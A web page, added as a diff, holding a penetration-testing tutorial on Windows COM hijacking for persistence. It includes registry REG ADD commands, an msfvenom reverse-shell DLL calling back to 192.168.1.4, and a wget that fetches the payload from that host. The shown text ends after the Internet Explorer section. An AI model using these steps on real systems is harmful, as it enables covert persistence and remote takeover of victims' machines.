@@ -1,0 +1,193 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Persistence: COM Hijacking (MITRE: T1546.015)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-persistence-com-hijacking-mitre-t1546-015/" rel="bookmark"><time class="entry-date published" datetime="2022-04-06T09:30:11+00:00">April 6, 2022</time><time class="updated" datetime="2025-06-23T19:09:09+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">According to MITRE, “Adversaries can use the COM system to insert malicious code that executes in place of legitimate software by hijacking COM references and relationships as a means for persistence.” To hijack a COM object, an attacker must modify certain registry hives and replace the reference to a legitimate system component with a malicious one. When the application runs and calls the COM object, the malware executes instead, thereby achieving persistence.</span></p>
+<p><span style="color: #000000;">In this article, we will cover the methodology for COM hijacking.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>MITRE TACTIC: Persistence (TA0003), Privilege Escalation (TA0004)</strong></span></li>
+<li><span style="color: #000000;"><strong>MITRE TECHNIQUE ID: T1546 (Event Triggered Execution)</strong></span></li>
+<li><span style="color: #000000;"><strong>SUBTITLE: T1546.015</strong></span></li>
+</ul>
+<h3><span style="color: #000000;"><strong> </strong></span><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;">Background</span></li>
+<li><span style="color: #000000;">Attack Methodology</span></li>
+<li><span style="color: #000000;">Discover Hijackable Keys</span></li>
+<li><span style="color: #000000;">InProcServer32: CacheTask (Physical Access to Machine)</span></li>
+<li><span style="color: #000000;">InProcServer32: CacheTask (Remote Access to Machine)</span></li>
+<li><span style="color: #000000;">InProcServer32: Internet Explorer (Remote Access)</span></li>
+<li><span style="color: #000000;">LocalServer32: Remote Access to Machine</span></li>
+<li><span style="color: #000000;">Conclusion</span></li>
+</ul>
+<h3><span style="color: #800000;">Background</span></h3>
+<p><span style="color: #000000;">According to Microsoft, “The <strong data-start="207" data-end="249">Microsoft Component Object Model (COM)</strong> is a platform-independent, distributed, object-oriented system for creating <strong data-start="326" data-end="356">binary software components</strong> that can interact. <strong data-start="376" data-end="383">COM</strong> is the foundational technology for Microsoft’s <strong data-start="431" data-end="438">OLE</strong> (compound documents), <strong data-start="461" data-end="472">ActiveX</strong> (Internet-enabled components), and other technologies.”</span></p>
+<p><span style="color: #000000;">Importantly, <strong data-start="552" data-end="559">COM</strong> is not a programming language but a standard that applies only to <strong data-start="626" data-end="641">binary code</strong>. Programming languages like <strong data-start="670" data-end="677">C++</strong> provide simple mechanisms to interact with <strong data-start="721" data-end="736">COM objects</strong>, while <strong data-start="744" data-end="749">C</strong> and <strong data-start="754" data-end="762">Java</strong> also implement <strong data-start="778" data-end="785">COM</strong>.</span></p>
+<p><span style="color: #000000;">A COM object allows access to the object’s data exclusively through one or more sets of related functions. We call these function sets interfaces, and we refer to the functions within an interface as methods. Additionally, COM requires that a pointer to the interface grants access to its methods. In short, <strong data-start="1180" data-end="1187">COM</strong> enables a binary to interact with other <strong data-start="1228" data-end="1248">software objects</strong> or <strong data-start="1252" data-end="1267">executables</strong> by implementing objects that call <strong data-start="1302" data-end="1310">DLLs</strong> and <strong data-start="1315" data-end="1323">EXEs</strong>.</span></p>
+<p><span style="color: #000000;">Furthermore</span>, <span style="color: #000000;"><a style="color: #000000;" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN">DCOM</a> (Distributed COM) extends <strong data-start="1383" data-end="1390">COM</strong>’s functionality beyond a local computer using <strong data-start="1437" data-end="1468">remote procedure call (RPC)</strong> technology. By default, only <strong data-start="1498" data-end="1516">Administrators</strong> can remotely activate and launch <strong data-start="1550" data-end="1565">COM objects</strong> via <strong data-start="1570" data-end="1578">DCOM</strong>. <strong data-start="1580" data-end="1588">DCOM</strong> can execute <strong data-start="1601" data-end="1611">macros</strong> in <strong data-start="1615" data-end="1635">Office documents</strong> and interact with <strong data-start="1654" data-end="1670">WMI remotely</strong>, thus opening the attacked domain to various attack vectors.<br/>
+</span></p>
+<p><span style="color: #000000;">Please note that this attack applies to a <strong data-start="1784" data-end="1808">domain-joined system</strong>. <strong data-start="1810" data-end="1827">DCOM remoting</strong> is not enabled across networks by default. To enable <strong data-start="1881" data-end="1898">DCOM remoting</strong> in a non-domain-joined system, additional code is required, which falls outside the scope of this article.</span></p>
+<h5><span style="color: #000000;"><strong>Registries: </strong></span></h5>
+<p><span style="color: #000000;">The <em>registry</em> is a system-defined database in which applications and system components store and retrieve configuration data. The data stored in the registry varies according to the version of Microsoft Windows. Applications use the registry API to retrieve, modify, or delete registry data. More info <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry">here</a></strong></span>.</span></p>
+<h5><span style="color: #000000;"><strong>CLSID: </strong></span></h5>
+<p><span style="color: #000000;">The CLSID or Class Identifier is a string of alphanumeric (both numbers and alphabet characters) symbols that are used to represent a specific instance of a Component Object Model or COM-based program. It allows operating systems and software, particularly Windows, to detect and access software components without identifying them by their names. More info <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/com/clsid-key-hklm">here</a></strong></span>.</span></p>
+<h3><span style="color: #800000;">Attack Methodology</span></h3>
+<p><span style="color: #000000;">Basically, any application which is triggering an EXE/DLL or some other library first reads the HKCU (HKEY_CURRENT_USER) value and then HKLM (HKEY_LOCAL_MACHINE). So, if a hijackable key is found, we will create a corresponding CLSID in the HKCU hive and thus, the application will trigger the HKCU hive first (therefore, executing our code instead of legit code).</span></p>
+<p><span style="color: #000000;">To perform the attack, we have to follow these steps:</span></p>
+<ul>
+<li><span style="color: #000000;">Find hijackable keys in the registry. COM servers that have missing CLSIDs and don’t require elevated privileges (belonging to the HKEY_CURRENT_USER category)</span></li>
+<li><span style="color: #000000;">Add a corresponding CLSID and strings referring to the application that had missing CLSIDs</span></li>
+<li><span style="color: #000000;">Create a malicious file</span></li>
+<li><span style="color: #000000;">Prompt the user to run the application which is supposed to trigger the COM event and run a malicious file.</span></li>
+</ul>
+<h3><span style="color: #800000;">Discover Hijackable Keys</span></h3>
+<h5><span style="color: #000000;"><strong>Part 1</strong></span></h5>
+<p><span style="color: #000000;">To discover hijackable keys, we would require a process monitor. We need to put these 4 filters:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Operation is RegOpenKey Include</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDV7r0ezJTAfkZItwubFdWmQwEL497Qhhc6DRC-BZPPSbE1lgN8b_iaNmO4b066eRk49vkUboZOOm-GHPsr49WE2_VfTDUP8oqliwsh_2--v6NXD3SpunhmwOWou5l7QkPkvuwF0rabB7YLmXRvuIK5UM04Z_bXFb_wW1naFjDaZ97tqufxFjjbMfIqA/s16000/1.png"/></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Result is NAME NOT FOUND Include</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAH7NH8rKVcRh7qSDFvNooqX1wyGWUmFcgQm9j7KBCgNuf5ljisxcN92LpZZSwTbf4K3nC_ugGlaJGlQwll8NNWks8d5c8engO2eFT-YQz3cBUXpjZy3e1OIrHypFTY0fYOz5-BCOjHfl-YOBAaXKPXujtPntGplyTWLcTHbXeL3AgZSLk7UO5BA1KAw/s16000/2.png"/></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Path ends with InprocServer32/LocalServer32 Include</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-tBDRwwhr44igxvVgM_Dv3KKLBvB22RH-kEK67haBUQo2t0OqkGqBzitbHlaNLVyPOoBOvV8aYGkrFcAq3QgqtZAr9GSM2G94XtYzq7fh4xCtUSl51yX3Lg6LLYlxsOV3jNlfRJpjxU9kwkBCNf9xST5-dCC58z1Cn-uGCJbAZJsQ2ryf74UENEG-Pg/s16000/3.png"/></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Path begins with HKLM Exclude</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkHH9M4SCyYpaAqSKomjNYh4YZ4ZbhGM_Fz9uqktAPyQrC459ebKypdQXdepdXagAWTiSeB8JBKlfiZ6w1IdJgOe1iUabeytJB98UNn5cABkw2Rdtkz802nQB2fr1RY6tGGsMb2mr9l-4DzCBfQP2wFxWsRazGiLBk3xqw_gdn4xvTaPlxQS2Kr5tfdw/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Now you’d have an output of all the probably hijackable keys.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZxbHr_mn12myJ3BseTIRdjI7Si7EPzeJY0Jgdvmj1RmmmjzOMrad2UzlQxuFVxgcuf2pihE_GDLZ0ABebnbaoVXn9DSht_dVbM7ns2_p2Ck0VS2hDH_5kt8J9CXYZFPan5BGOWEiz65YjTizgOT2mVd_q-ormQtSNiLDgTXZSNh_vbo4WIT7bodwNCw/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">We can export this result and save it as “Logfile.CSV”. nccgroup developed a script called <a style="color: #000000;" href="https://github.com/nccgroup/acCOMplice">acCOMplice</a> which can take in this CSV as input and give out all the keys that can be hijacked. Here, we are viewing InprocServer32 hijackable keys. We can download and use it like:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\COMHijackToolkit.ps1
+Extract-HijackableKeysFromProcmonCSV -CSVfile .\Logfile.CSV</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZGsBF0Rrry1Y4lWF_ZJUiRHNKoPAYRv9xq5kwTZfdqUfINIi7KK2v9W1pRE65S6qzKAKWBGW1stac1_o8LE0SIJ6A4R04kJNzgT0o8dakVJC7LSqMzsNQrCtCSnSpjui9M3RlMjDrQGlV4zl8PxvqOgOArVJIPyN_un5D1AkhvmZf86s0bP5AlznDzQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Another function in the same script will fetch the related CLSIDs and the missing DLL files/libraries.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2Rp-qnGs3OZkWIxkdbGfggVqfABGeO57iDMVW5EtYW3K8-5bhDYQSGskIS4UvgGx-tPOdyty0JffviZOAbNQs2YlFawXOQkvxVVyyiFhGQ-sZSjjZZeh56e4L3ZcXbRLL1HML_vm8hPAm2SMJUrtdGQtCoyn88ouFalHotWvVJU0aKfWqK8L4Ua2B0Q/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">These are all the DLLs that are missing from the disk. So, if we just upload our malicious DLL onto one of these paths and rename it as the DLL mentioned.</span></p>
+<h5><span style="color: #000000;"><strong>Part 2</strong></span></h5>
+<p><span style="color: #000000;">Enigma0x3 developed a script called <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1">Get-ScheduledTaskComHandler.ps1</a></strong></span> which can Discover all the vulnerable COM Keys of all the scheduled tasks on the machine that execute on user logon. To do this, we just download it and run it like:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\Get-ScheduledTaskComHandler.ps1
+Get-ScheduledTaskComHandler</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEii4M8L58lanyDpzV_mef-VAF0ZPdOmPFrEWnL2Rp3r6ZTp7W9BsLWcNdBn2iCMkozm1Q0AkEi5PxeOshWbQGtZhSLSzmfJfFL4CfNmBcdyIkZuLRafwfGH6JBRjtduJkTTTCPECVIIQ3yIKRNibrKl9rV1dsnJIuWpRzdsMThNaM23B15kEpigM7Xa2Q/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">The script also has a great added module that can automatically identify scheduled tasks vulnerable to COM Hijacking which can give persistence to the system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-ScheduledTaskComHandler -PersistenceLocations</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5m9TuKHvVzH-yquP1sModJfP8dM1LLiMmZVtRPY_jqjB5He9Nqno3A-FkjUfpzlsvImP6qMTiZuiCkfI-O7hIZv3-iwiag1Beb8cta7OwAxspl2c6NrU6fFTwXgVAB1l3DAZ1uESszXOK63sct3UlS4xwvsMb94ue3zdwL_o7SMyVN79ePPH5UPGt0w/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Let’s pick a task called cache task which uses wininet.dll upon first time logon.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5VvDuhLEh9usfEI4WpFMY4BqZcbmYv-82599o90u3erZ7aHocsn7EAO_FNuzRXvbWmyRf1-5AxmcgPUVDov2EMYMemDtTvbPNKuIM63dk3c8z6PsJifqyg6wQj8NOIVGboRwSnbxIta0psgCzewxvhbkE6AEhaj_n9HO6g2u6rThCvn_w11z1H2bL6w/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">By default, all the tasks are configured in the folder %sysroot%\Tasks. The configuration file of this task is available at the location:</span></p>
+<p><span style="color: #000000;"><strong>C:\Windows\System32\Tasks\Microsoft\Windows\Wininet\CacheTask</strong> which can be read using schtasks</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">schtasks /query /XML /TN “\Microsoft\Windows\Wininet\CacheTask”</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfh39U4Ai5M3gsgRlyfnF99eju4f758jQ_WGbfbEW6rOOCZXH2BZuwfeBJkB00vaf_y2mACJR561ixYJuBaJaUEyQI7RReS-BjU3Cy-m_4a54N_aDPN49suUpa3gaxf4_seTNc57F1L1f5tjnaFCpBx8dHuRj48DPSk1aJ29edzvFd-iq7S2dFFr01Cw/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Here, we now have the CLSID of the COM object which calls wininet.dll. We can open the registry hives and confirm if this COM object is calling wininet.dll</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiONKbSJtxbORhn6TlU2gPllEqcqKfFMqyuUaGTkQsv2G9zg7rD1Cnaw-amb5iixGcVWf2Ud1tlX29S5Z0MrCD52zIwoA0Lkv0bUZR_yUr-961t09exShiOPpXRTjpjyeGaF_ghSn_LByklY8xnZo8jzbtRF_cxspKRiYD8cN8gBJzGOETqwYYxPSFKLA/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Now that we have identified a target, let’s use this COM object to conduct hijacking.</span></p>
+<h3><span style="color: #800000;">InProcServer32: CacheTask (Physical Access to Machine)</span></h3>
+<p><span style="color: #000000;"><strong>InProcServer32: </strong>InProcServer32 key represents a path to a dynamic link library (DLL) implementation. Often used to represent DLL which is supposed to be run by a process.</span></p>
+<p><span style="color: #000000;">In the enumeration above, we found out a COM object is vulnerable to hijacking. This registry exists in HKLM. As per the methodology, we need to create this same CLSID in HKCU (HKEY_CURRENT_USER) hive.</span></p>
+<p><span style="color: #000000;">So, we open the registry hive and create this key</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\</pre>
+<p><span style="color: #000000;">Then we create one other key named:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">{0358b920-0ac7-461f-98f4-58e32cd89148}</pre>
+<p><span style="color: #000000;">Again, right-click on this key and add a new subkey:</span></p>
+<p><span style="color: #000000;"><strong>InProcServer32</strong></span></p>
+<p><span style="color: #000000;">Then under this, we create two strings, one with value: <strong>C:\users\Public\shell.dll</strong> and the other with the name “<strong>ThreadingModel</strong>” and value “<strong>Both</strong>”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpEukZCfqBCHpuZaMk7TWQPZXF5q2o416bL55yLvcFXocUkBVAVzNtbKUFMVW3LmymBV4a7XS6EjLitl1Zb8gRyiopIGg8t_r2yrg59WMxZl36Z94pUONUo2bhlqAn2mxA_kJGkBwAO6nyJjk3s7FbuRQgB0SAC9c8dYiXAZq5njo_KWzsxUKxvzvFnQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Now, the path we just added doesn’t contain shell.dll. This is the code that will be executed when the user logs in. Let’s create a msfvenom DLL shell and upload it onto the victim system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread lhost=192.168.1.4 lport=1337 -f dll &gt; shell.dll</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0PeemyjpREZSytGsNgbozJHpfozIJFz_4lZaPZF6TvlEIprXt0mOEiGKw1G2yClmHzk1__9-S2pwnPDEDYMw3Wp5LCk8RnYRzlqY_wwtq_SkAvkQhPoEuoEIZYe1713PALFj487tXsNK5DXkP0DDmPeg0VeipSYknNQ3wso0SXmAUhS-vE44UxYvAvg/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Now, upon restart and first logon by the user, we will receive a reverse shell like so:</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhoHzorCIAdM_fON9l1RpzTASMpbbwC489bSFjp38Wo6MZBkdoBFiworD3uAo_QiWJsjY5awCCDjvc4F4obu9JVM8p8iyVMx_DcvHjaEWOzc-fblsEmEZoRZnlm5ReUUQw-VYWoBR_UuMZUFNzZILmu_rDZ2D8Wy_rSaV5ats0v6b-b4tJ0gcF7tV4mJg/s16000/15.png"/></strong></span></p>
+<h3><span style="color: #800000;">InProcServer32: CacheTask (Remote Access to Machine)</span></h3>
+<p><span style="color: #000000;">What we just did above can be done remotely as well. First, we need access to the victim’s powershell (which can be obtained by using Nishang) and then we will use the following code provided by bohops.com found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/">here</a></strong></span>. To find COM keys vulnerable to hijacking which include InProcServer32 keys we do:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$inproc = gwmi Win32_COMSetting | ?{ $_.InprocServer32 -ne $null }
+$paths = $inproc | ForEach {$_.InprocServer32}
+foreach ($p in $paths){$p;cmd /c dir $p &gt; $null}</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8gmKKdkXxlX0ky-gCmfNNczksVXXzf4tlCNqaceQuzvgJOfrNLt-Rf0CxhYWrps0_PTvK679ImG8Y0rmcuXg_EflaFPEr4G7oE0h0IiaExumn3ESO32QMWwOPZu0-JbbX0AmaDxj-XXvGN-pHPfRnYy2yh8V9R9hxTL2P6UrO9rAGZdii8oCTdOMJgg/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Similarly, these results can be stored in a text file using the code:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$inproc = gwmi Win32_COMSetting | ?{ $_.InprocServer32 -ne $null }
+$inproc | ForEach {$_.InprocServer32} &gt; ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUugW0XoU5eZZpMaw7c97i2RvkRP7OFn1Hct4UmlkO4nFcoy_X1B6B_ztCClrAXpk5f8tOryAKlpfRNGGJ0CcZFmXi2EoVMACAIt4Az7JYgloSgPmcCej_cuS2Y2EO3QPkOLcKKOzM8xBaU-hZ71mY_xGZmrRSyOC5KY8ITou_6pH7LtoQ91Rx67e3BA/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">In the enumeration and exploitation example above, we used CacheTask and overridden the wininet.dll by shell.dll</span></p>
+<p><span style="color: #000000;">Upon searching wininet.dll in this text file, we see that it exists</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5yjuONxnQRheYD8lrJR3xXv7bfpVycAtXQSPdkkPcTbkreVptI8UPJ30nieURmRL7eiZeNFRZ5kSlebAE4BHavYclfbO_3bjSBl-6Bl6V9vPAaNnkVMfvkfu_zNL0CX212lHwY_MstfvRgOtX-ME8xcHf9H2KnlajKIvm2Ofo8E-OCGvMJO3FN7RheA/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">So, we can view CacheTask’s configuration file like so:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Windows\System32\Tasks\Microsoft\Windows\Wininet
+type CacheTask</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEij_z6DLrHt_9oEqraM682pjQ3HHdYtkUYTUxkVGC-i5TkAas3DAc_NDnl841FYvnPRgpkeuavGfL0s0Fh2F40fThoxBO7afLxsA1dmHh-o53MmNJOvaqouM81B__cEFv1rX1pdgqFTWnQhWQnwGFAMd1MMrw7YTX07qm8TZ3lBIAZWdqdssnq4BY1GJA/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Now, we have obtained a CLSID. This exists in the HKLM hive. We need to create this in HKCU using the “reg add” command. Then, we can confirm if it added successfully using the reg query. Finally, to check if it works, we can restart it and wait for a user to logon</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">REG ADD HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InProcServer32 /t REG_SZ /d C:\Users\Public\shell.dll
+REG ADD HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InProcServer32 /t REG_SZ /v ThreadingModel /d Both
+REG QUERY HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InProcServer32
+shutdown -r</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivP_aN6kXUOeW4IdCaMy-CBpZZCbqUIw6M-FJmkmoR40gwLFc6HISCK6h-FJSHMbD_4DGxjBmzIKSMtiTu7Gk41p3wEwLI41Hx5bsT-9hX0xjvSLYtJbr_pfHKWb57tzLTR0F_BthRjOXnS-V7mn07xgmQ5FCaCehyrex3TU5Yxy7CdO1Vh23sqh859Q/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">Now, when the system restarts and user Harshit logs in again, we will confirm that we have achieved persistence with a reverse shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmIJTNrosP_Fe5K-pP9roGH4kA5Wpu4cdrrF5hNcfQRCOMWC3CMXMxgqEdA2T0OqrCgyiFnVCLGhc2cYd5h9oCGwCaHdQFqC53bSFd2p1M5mipvA7Dd0SHTwJImN0w47IYNEtG-i1IjJgdBisi-A83cdFxxQRw8a0k1QIuCmJJ614ZHl-YWXZ9KAq6Xg/s16000/21.png"/></span></p>
+<h3><span style="color: #800000;">InProcServer32: Internet Explorer (Remote Access)</span></h3>
+<p><span style="color: #000000;">GDATA provided this method of persistence in a post <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence">here</a></strong></span>. Internet Explorer is widely used in corporate even today. Upon reading its documentation, it was observed that IE uses the following DLL: <strong>api-ms-win-downlevel-1×64-l1-1-0._dl</strong></span></p>
+<p><span style="color: #000000;">IE’s CLSID exists in: <strong>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</strong></span></p>
+<p><span style="color: #000000;">This DLL doesn’t exist by default in the system, so, to do COM hijacking, we will create the following folder and add this DLL here.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\Users\harshit\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</pre>
+<p><span style="color: #000000;">Now, to execute this attack, we need to override the IE CLSID by referring to that CLSID in HKCU hive as we did in the example above.</span></p>
+<p><span style="color: #000000;">First, let’s create a new malicious DLL file and name it “<strong>api-ms-win-downlevel-1×64-l1-1-0._dl”</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8tQzPVE7Z3sTKTiwi--tO2kbHtT1kIA2ImSxgiWPnDiXyWgJmeAUDzZqgQ_iZzKQ8MxcKWmPEk81RF6aKX1ETDt5ombkPSUZt40XwFLn7-lmLzqGQDQ1mHU5ZXijfyPMpi7weWXQx4z4kx-XWnAcn-HRoQa3Hibe_TeXgzxuiHTMAgcutA2Ps43pjQQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">Now, we create the folder: C:\Users\harshit\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\users\harshit\appdata\roaming\microsoft
+mkdir installer
+cd installer
+mkdir {BCDE0395-E52F-467C-8E3D-C4579291692E}
+cd {BCDE0395-E52F-467C-8E3D-C4579291692E}
+powershell wget 192.168.1.4/ api-ms-win-downlevel-1×64-l1-1-0._dl -O api-ms-win-downlevel-1×64-l1-1-0._dl</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjE6RMSCLYoB7E6Aq5HViGPbaM5nGndaKLdNit_r2midqexgB-Eeaw-OISnD0Y-4Zrcu3gEtLirtbmo3PcWPw79BGZwMXe-0ch14gD5T6XondQK8nrouu3MXp4co2OVHZW1ZhuhYRjGQ_Hh__bUWQjiO8S7W3eOv9Qg4GnZ33KKAIB5Dw6RBCwH_D1mcA/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">Now, we will add the IE CLSID reference in HKCU.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">REG ADD HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InProcServer32 /t REG_SZ /d C:\Users\harshit\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x64-l1-1-0._dl
+REG ADD HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InProcServer32 /t REG_SZ /v ThreadingModel /d Apartment</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgi3xNeXUW7OJBfIp6IlofI8DtQaWfXuvjQR3_LWlVjsMVMEUEGHdAPBCRN0XYsuPgiKQS7Z9e_6kruHw-5ejmI7JgQpDb7gbz1PZKs9Tn1QbH4fU0HCxV7yJYBngvrIZOM-RDzPeVWE3SgKU2tBzDzyklC1s6p1X8Fic1KOLxmFQQkVONfDDtfRu0liA/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">Finally, once the COM hijacking has been done, as soon as IE launches, we will receive a reverse shell!</span></p>
